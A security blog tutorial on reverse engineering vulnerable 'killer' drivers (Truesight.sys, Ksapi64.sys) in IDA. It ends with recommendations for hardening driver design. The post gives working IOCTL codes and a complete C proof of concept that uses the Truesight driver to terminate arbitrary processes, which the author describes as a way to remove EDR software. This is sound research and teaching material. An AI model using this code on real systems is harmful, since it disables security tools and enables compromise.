# https://whiteknightlabs.com/2025/10/28/methodology-of-reversing-vulnerable-killer-drivers/

![White Knight Labs Training Bundle](https://whiteknightlabs.com/wp-content/uploads/2025/12/WKL_Click-Here_R1-01.jpg)[Full Bundle](https://buy.stripe.com/5kQcN55DFb5K8Rggfg9IQ0t "Full Bundle")[2 Class Bundle](https://buy.stripe.com/5kQbJ14zB7Ty8Rg9QS9IQ0y "2 Class Bundle")[3 Class Bundle](https://buy.stripe.com/fZu8wPc235Lq3wW0gi9IQ0x "3 Class Bundle")

[![White Knight Labs Logo](https://whiteknightlabs.com/wp-content/uploads/2024/08/Logo-v2.png)](https://whiteknightlabs.com/)

Menu

Edit Template

# Methodology of Reversing Vulnerable Killer Drivers

- Iván Cabrera
- October 28, 2025
- Uncategorized

Vulnerable kernel drivers are one of the most reliable stepping stones for privilege escalation and system compromise. Even when patched, many of these drivers linger in the wild: signed, trusted, and quietly exploitable. This blog dives into the process of reversing known vulnerable drivers (focusing on process killer drivers), exploring how to dissect their inner workings, uncovering their flaws, and understanding the exploit paths they enable. We’ll walk through identifying attack surfaces, tracing IOCTL handlers, and examining vulnerable code paths that attackers can abuse.

A very effective way to strengthen your reversing skills is through hands-on practice with multiple drivers. While the general methodology remains the same across most killer drivers, each one contains small structural or logical differences that help deepen your understanding of driver internals. Personally, I leverage resources like [**loldrivers.io**](https://www.loldrivers.io/) to practice. This site provides a large collection of vulnerable, signed drivers that have been actively abused in real-world attacks. By analyzing several of them in sequence, you can build intuition about recurring patterns, such as:

- How drivers typically register devices.
- Common patterns in IOCTL dispatch routines.
- Different ways that process-handling APIs like **ZwTerminateProcess** are exposed.

But first, we need to understand certain theoretical concepts about drivers.

### Before We Begin, What Is a Driver?

A driver is a specialized piece of software that allows the operating system (OS) to communicate with hardware devices. The OS itself doesn’t know the specific details of how each hardware component works (e.g., a printer, keyboard, or graphics card). Instead, it relies on drivers, which act as a translator between the hardware and the OS. Without drivers, the OS would not be able to send commands to or receive data from hardware properly.

Drivers define a specific entry point known as **DriverEntry**. Unlike regular applications, they do not possess a main execution thread, instead, they consist of routines that the kernel can invoke under particular conditions. Because of this, drivers typically need to register dispatch routines with the I/O manager in order to handle requests originating from user space or other drivers.

For a driver to be accessible from user mode, it must establish a communication interface. This is usually done in two steps: first by creating a device object, and then by assigning it a symbolic link that user-mode applications can reference.

A device object acts as the entry point through which user processes interact with the driver’s functionality. On the other hand, a symbolic link serves as a more convenient alias, allowing developers to reference the device in user space through common Win32 API calls without needing to know the internal kernel namespace.

The Windows kernel provides dedicated routines for this purpose:

- **IoCreateDevice** generates a device name, e.g., `\\Device\\TestDevice`.
- **IoCreateSymbolicLink** sets up a symbolic link, e.g., `\\\\.\\TestDevice`.

When reverse engineering drivers, encountering these two functions being invoked in sequence is a strong indicator that you’ve found the code responsible for exposing the driver to user mode.

When a Windows API is invoked on a device, the driver responds by running specific routines. The driver developer defines this behavior through the **MajorFunctions** field of the **DriverObject** structure, which is essentially an array of function pointers. Each API call, such as **WriteFile**, **ReadFile**, or **DeviceIoControl**, maps to a particular index in the **MajorFunctions** array. This ensures that the correct routine is executed once the API function is called.

Within the **MajorFunctions** array, there is a dedicated entry identified as **IRP\_MJ\_DEVICE\_CONTROL**. At this position, the driver stores the function pointer to its dispatch routine, which is triggered whenever an application calls **DeviceIoControl** on the device. This routine plays a critical role because one of the parameters it receives is a 32-bit value called the I/O Control Code ( **IOCTL**).

### Hands-on Practice in Real Environments

We begin by analyzing the famous Truesight driver. You can find most of these drivers on the following website: [loldrivers.io](https://www.loldrivers.io/)

#### Truesight.sys

The first thing we do to analyze a driver is to download it. When you click the download button, a ‘.bin’ file will be downloaded.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-5-1024x454.png)

To analyze it, we will use IDA free, so that everyone can use this free version. When loading the driver with IDA, the tool itself displays the **DriverEntry**. **DriverEntry** is the main entry point for the driver, essentially the driver’s version of **main()** in a regular C program.

Some drivers have more or less logic implemented in the main function, in this case, we do not have much information. The first thing we see is a call to the **sub\_14000A000** function. Click on it.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-6-1024x571.png)

Within the function, you can see the device name. Remember, devices are interfaces that let processes interact with the driver:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-7-1024x519.png)

When debugging the code (by pressing F5), we can see more clearly and observe the **sub\_1400080D0** function:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-8-1024x614.png)

When entering this function, we can see a call to the **IoCreateDevice** API. **IoCreateDevice** creates device names. In the previous image, we can also see the dispatch routines.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-9.png)

Now, in the Imports window, you can see calls to the **ZwOpenProcess** and **ZwTerminateProcess** APIs, which are the ones that are usually looked at to remove binaries using that driver.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-10-1024x525.png)

Click on **ZwTerminateProcess** and cross-references are searched (by pressing Ctrl+X). It can be seen that this API is called in the **sub\_140002B7C** function:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-11-1024x252.png)

The function purpose is quite clear. Furthermore, there are no protections to prevent the deletion of critical system binaries or those with PPL enabled, which will be discussed later. In summary, when the PID of a process is passed to it, it deletes it using **ZwTerminateProcess**:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-12.png)

Now we have to do a bit of reverse engineering and find a way to call that function. To do this, we look for cross-references again and see that the function **sub\_140002BC7** is called in **sub\_140001690**.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-13.png)

When opening the function, the IOCTLs are still not visible, so we repeat the process:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-14-1024x411.png)

Now, if we look at the call, we see that if the condition **v10 == 2285636** is true, the desired function is called. The question is, how can we access that function to pass it the PID we want?

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-15-1024x541.png)

If we look closely at the rest of the previous function, we see the following IOCTL **0x22E044**. So, knowing all this, we now know how to fulfill the necessary condition ( **v10 == 0x22E044**) that will call all the other functions until it reaches **ZwTerminateProcess** with the PID of the process we want to stop.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-16-1024x527.png)

With all this, we can now create a PoC, load the driver, and remove any binaries from the system.

_\*Note: Be careful, this driver is flagged by EDRs, so if you download it, alerts will be triggered._

**Proof of Concept:**

```
#include <windows.h>
#include <iostream>
#include <cstdint>
#include <cstdio>
#include <cstdlib>

#define IOCTL_TERMINATE 0x22E044
#define DEVICE "\\\\.\\TrueSight"

int main(int argc, char** argv) {
ULONG_PTR output[1] = { 0 };
ULONG bytesReturned = 0;
DWORD lastError = 0;

HANDLE hDevice = CreateFileA(
DEVICE,
GENERIC_WRITE | GENERIC_READ,
0,
NULL,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
NULL
);

if (hDevice == INVALID_HANDLE_VALUE) {
lastError = GetLastError();
printf("[-] Failed to open device. Error: %d (0x%x)\\n", lastError, lastError);
return 1;
}

printf("[+] Device handle obtained.\\n");

unsigned int pid;
DWORD lpBytesReturned = 0;

printf("PID please : \\n");
scanf("%u", &pid);

BOOL result = DeviceIoControl(
hDevice,
IOCTL_TERMINATE,
&pid, sizeof(pid),
NULL, 0,
&lpBytesReturned,
NULL
);

if (!result) {
lastError = GetLastError();
printf("[-] DeviceIoControl failed. Error: %d (0x%x)\\n", lastError, lastError);
} else {
printf("[+] DeviceIoControl succeeded.\\n");
}

CloseHandle(hDevice);
return 0;
}
```

The code opens a handle to the device exposed by the TrueSight driver (`\\.\TrueSight`) and sends a IOCTL (`0x22E044`) along with a process ID. At high level, the PoC follows four steps: obtain a handle to the driver, collect a PID from the user, call `DeviceIoControl` to send the IOCTL and the PID to the driver, and then close the handle.

`CreateFileA` is used to open the device, opening `\\.\DeviceName` via `CreateFile` yields a handle that can be used for further operations.

The core action is performed by `DeviceIoControl`. This API packages the control code and input/output buffers into an IRP which the kernel dispatches to the driver’s `IRP_MJ_DEVICE_CONTROL` handler.

In conclusion, the program receives the process PID, communicates with the driver using IOCTL, and deletes it.

#### Ksapi64.sys

The **Ksapi64.sys** driver is another example of a driver abused primarily to disable or remove binaries from EDR solutions. Its core logic is similar to other drivers we’ve examined, but with slight variations that make it worth studying.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-17-1024x428.png)

Unlike TrueSight, the main function in Ksapi64 is larger and places more initialization logic directly inside **DriverEntry**. One benefit of this driver is that you can inspect device creation and dispatch setup without needing to dive as deeply into sub-functions; the important pieces are presented more directly in the pseudocode.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-18-1024x482.png)

When debugging, the pseudocode is even clearer:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-19.png)

As with the other drivers analyzed, once we have reviewed the initialization logic and identified the created devices, the next critical step is to track how the driver interacts with sensitive kernel APIs.

The import that stands out here is once again:

- **ZwTerminateProcess** – The kernel function exposed by Windows that allows the forced termination of processes by their handle or PID.

In IDA, the most practical way to confirm where and how this API is used is by performing a cross-reference search:

- Highlight **ZwTerminateProcess** in the Import Names window.
- Press Ctrl+X to bring up the list of all references to it.

This simple action reveals the exact functions inside the driver where process termination calls are made:

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-20-1024x475.png)

Now, the same is done with this function to find the IOCTL, which in this case is **0x2237504**.

![](https://whiteknightlabs.com/wp-content/uploads/2025/10/image-21-1024x240.png)

You can do the PoC 😉

Defensive Factors to Keep in Mind

When dealing with killer drivers, one of the main defensive strategies lies in restricting what processes they are allowed to terminate. A well-designed driver should never expose unfiltered access to sensitive kernel routines like **ZwTerminateProcess**, because without validation, attackers can weaponize the driver to kill arbitrary processes, including system-critical ones.

#### Why Unrestricted Process Termination Is Dangerous

- **Critical System Processes**: Processes such as **csrss.exe**, **wininit.exe**, or **lsass.exe** are essential for the stability of Windows. Terminating them results in severe system instability, BSODs, or immediate reboots. An attacker who gains the ability to kill these can force denial-of-service (DoS) at will.
- **Security Processes**: Many Endpoint Detection and Response (EDR) tools rely on protected processes to remain tamper-resistant. If a vulnerable driver allows unrestricted termination, attackers can disable or bypass security solutions with a single IOCTL call.

#### Protected Process Light (PPL)

Microsoft introduced PPL (Protected Process Light) to mitigate exactly this kind of threat. PPL elevates certain processes (e.g., antivirus, system integrity services) to a protected state where only code with specific privileges or signing requirements can terminate or inject into them. However, if a third-party driver exposes **ZwTerminateProcess** without restrictions, this security mechanism is bypassed entirely.

Thus, drivers should not only validate IOCTL requests but also enforce logic to prevent termination of processes running with PPL enabled.

#### Design Recommendations

To mitigate killer driver risks, developers should adopt stricter validation practices when exposing process manipulation capabilities through drivers:

- **Allowlist / Denylist logic**
  - Maintain a list of critical processes ( **csrss.exe**, **lsass.exe**, etc.) that should never be terminated.
  - Include checks inside IOCTL handlers to ensure that PIDs are not pointing to these protected processes.
- **PPL Awareness**
  - Before invoking **ZwTerminateProcess**, the driver should query whether the target process has PPL protections enabled. If it does, the termination request should be denied.
- **Access Control on IOCTLs**
  - Restrict which users or processes are allowed to send termination-related IOCTLs. Ideally, tie this access to admin-only contexts and enforce strong validation.
  - Reject malformed IOCTL requests or unexpected parameters that could be used for exploitation.

### Conclusion

In conclusion, killer drivers are incredibly interesting, offering layers of depth that go far beyond their surface appeal. Mastering them requires not only technical understanding but also patience and consistent practice. The more time you dedicate to experimenting, analyzing, and refining your skills, the more you’ll uncover their true potential. Whether you’re a beginner or an experienced enthusiast, remember that progress comes through practice, so keep pushing, keep learning, and let these powerful drivers challenge you to grow.

#### Recent Posts

- [Backdooring Electron Applications](https://whiteknightlabs.com/2026/01/20/backdooring-electron-applications/)
- [UEFI Vulnerability Analysis Using AI Part 3: Scaling Understanding, Not Just Context](https://whiteknightlabs.com/2026/01/13/uefi-vulnerability-analysis-using-ai-part-3-scaling-understanding-not-just-context/)
- [The New Chapter of Egress Communication with Cobalt Strike User-Defined C2](https://whiteknightlabs.com/2026/01/06/the-new-chapter-of-egress-communication-with-cobalt-strike-user-defined-c2/)
- [UEFI Vulnerability Analysis using AI Part 2: Breaking the Token Barrier](https://whiteknightlabs.com/2025/12/30/uefi-vulnerability-analysis-using-ai-part-2-breaking-the-token-barrier/)
- [Just-in-Time for Runtime Interpretation - Unmasking the World of LLVM IR Based JIT Execution](https://whiteknightlabs.com/2025/12/23/just-in-time-for-runtime-interpretation-unmasking-the-world-of-llvm-ir-based-jit-execution/)

#### Recent Comments

### Let’s Chat

#### Strengthen your digital stronghold.

![desigen](https://whiteknightlabs.com/wp-content/uploads/2024/08/desigen-1.png)

Reach out to us today and discover the potential of bespoke cybersecurity solutions designed to reduce your business risk.

What is 1 + 4 ? ![Refresh icon](https://whiteknightlabs.com/wp-content/plugins/ds-cf7-math-captcha/assets/img/icons8-refresh-30.png)![Refreshing captcha](https://whiteknightlabs.com/wp-content/plugins/ds-cf7-math-captcha/assets/img/446bcd468478f5bfb7b4e5c804571392_w200.gif)

Answer for 1 + 4

reCAPTCHA

Recaptcha requires verification.

I'm not a robot

reCAPTCHA

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

[![footer logo](https://whiteknightlabs.com/wp-content/uploads/2024/08/footer-logo.png)](https://whiteknightlabs.com/)

[Linkedin-in](https://www.linkedin.com/company/white-knight-labs/)[X-twitter](https://twitter.com/WKL_cyber)[Discord](https://discord.gg/qRGBT2TcEV)

#### [Call: 877-864-4204](tel:877-864-4204)

#### [Email: sales@whiteknightlabs.com](mailto:sales@whiteknightlabs.com)

#### [Send us a message](https://whiteknightlabs.com/2025/10/28/methodology-of-reversing-vulnerable-killer-drivers/\#chat)

#### Assessment

- [VIP Home Security](https://whiteknightlabs.com/vip-home-cybersecurity-assessments)
- [Password Audit](https://whiteknightlabs.com/password-audit-service)
- [Embedded Devices](https://whiteknightlabs.com/embedded-security-testing)
- [OSINT](https://whiteknightlabs.com/osint-services)
- [AD Assessment](https://whiteknightlabs.com/active-directory-security-assessment)
- [Dark Web Scanning](https://whiteknightlabs.com/dark-web-scanning)
- [Smart Contract Audit](https://whiteknightlabs.com/smart-contract-audit)

#### Penetration Testing

- [Network Penetration Test](https://whiteknightlabs.com/network-penetration-testing-services)
- [Web App Penetration Test](https://whiteknightlabs.com/web-application-penetration-testing)
- [Mobile App Penetration Test](https://whiteknightlabs.com/mobile-application-penetration-testing)
- [Wireless Penetration Test](https://whiteknightlabs.com/wireless-penetration-testing)
- [Cloud Penetration Test](https://whiteknightlabs.com/cloud-penetration-testing)
- [Physical Penetration Testing](https://whiteknightlabs.com/physical-penetration-testing/)

#### Simulation and Emulation

- [Red Team – Adversarial Emulation](https://whiteknightlabs.com/red-team-engagements)
- [Social Engineering Attack Simulation](https://whiteknightlabs.com/social-engineering-testing)
- [Ransomware Attack Simulation](https://whiteknightlabs.com/ransomware-attack-simulation)

#### Compliance and Advisory

- [Framework Consulting](https://whiteknightlabs.com/framework-consulting)
- [Gap Assessments](https://whiteknightlabs.com/gap-assessments)
- [Compliance-as-a-Service](https://whiteknightlabs.com/compliance-as-a-service-caas)
- [DevSecOps Engineering](https://whiteknightlabs.com/devsecops-engineering)

#### Incident Response

- [Incident Response](https://whiteknightlabs.com/incident-response)

#### Copyright © 2026 White Knight Labs \| All rights reserved

#### [Contact Us](https://whiteknightlabs.com/contact-us/)

Edit Template

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

reCAPTCHA